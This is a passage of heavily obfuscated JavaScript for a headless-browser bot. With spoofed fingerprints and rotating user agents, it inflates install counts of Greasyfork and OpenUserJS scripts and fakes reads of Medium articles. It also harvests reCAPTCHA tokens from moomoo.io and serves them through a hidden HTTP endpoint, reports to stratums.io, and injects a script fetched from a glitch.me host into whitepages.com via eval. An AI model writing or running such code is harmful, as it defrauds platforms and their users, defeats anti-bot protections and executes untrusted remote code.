      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + X(0x17, 'I1og') + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + W(0x5) + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + Y(0xa) + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + W(0x8) + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x258e + 0x25ae + -0x20
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0xeba + 0x1 * 0x26cb + -0x3 * 0x11d7)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const Z = b;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : Z(0xc, 'jZJn') == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xe65 + -0x13 * 0x65 + -0x682), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1f2a + -0x1 * -0x843 + -0x2709), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x287 * 0xc + 0x3b * 0x8 + 0xe3e * 0x2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1d19 * -0x1 + 0xdbb + -0x2ad4; w < getRandomInt(-0x1a83 + -0x3 * -0xa22 + -0x1 * 0x3e2, 0x2 * -0x272 + 0xf8c + -0xaa3); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x50f9 + -0x1 * -0x19d57 + -0x4 * 0x40fc);
        }
      }();
    }, 0x21db + 0xe1b + -0x2f92), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x48b * -0x5 + -0xfbd + -0x5e * 0x13;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })[a0(0x11, 'B!lG')](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0x131 + -0xe08 * -0x1 + -0xcd7, -0x83 * 0xe + 0x1d96 + -0x163a)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          const a1 = d;
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + a1(0x16), {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x2 * 0x563e + 0x1c89 + -0x53d5);
    }, -0x1618 + 0x11 * 0x1f0 + -0xa74), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2 * 0x5d1 + -0x1 * 0x7e2 + -0x3c0;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0xc8b * 0x3 + -0x3ab + 0x46b * 0xc), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0xa85 + 0x1 * 0x1e4f + -0x86 * 0x4e), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x119954 + 0x7e02f * -0x1 + 0x273523);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2 * 0x601 + -0x1d3 * -0x4 + 0x51a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * -0x88d + -0x626 + -0x3 * -0x529);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x31a4 + -0x3b98 + 0x2984);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d,
    a4 = c,
    a3 = b;
  async function f() {
    const a2 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x2 * -0xdee + 0x17a1 * 0x1 + 0x43c) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0xe04 + -0x43 * 0x3b + -0x6 * -0x4e9));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x11 * 0x1d + -0x1c3d + -0x21 * -0xea, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * -0x246f + -0x4 * -0x58b + -0x3a9b, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x10b0 + -0x1937 * -0x2 + 0xe3 * 0x6),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + a2(0xf, 'iRyQ') + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x191 * 0x3 + 0x2677 + -0x41a),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + a3(0x9, 'WiO^') + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + a4(0x2),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + a5(0x15) + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0xf76 + -0x6d1 + 0x1647; k < -0x93e + 0x22 * 0xfd + -0x1858; k++)
    setTimeout(f, (-0xd65f + 0x6487 + 0x15c38) * k * getRandomInt(0xf6b + -0xe7 + -0xe83, 0x6a * 0x24 + -0x156c + 0x687));
  setInterval(() => {
    f();
    for (let l = -0x17c7 + 0x684 + 0x9 * 0x1eb; l < 0x4 * 0x406 + -0x45e + -0x2 * 0x5db; l++)
      setTimeout(f, (-0x873 * 0x23 + -0xa214 + 0x2b42d) * l * getRandomInt(-0x1255 + -0x14 * 0x1c1 + 0x8e7 * 0x6, -0x1 * -0xfea + 0x1a3 * 0x8 + -0x1cff));
  }, -0x2 * -0x2af0ed + -0xe5c * 0x725 + 0x47a3f2);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
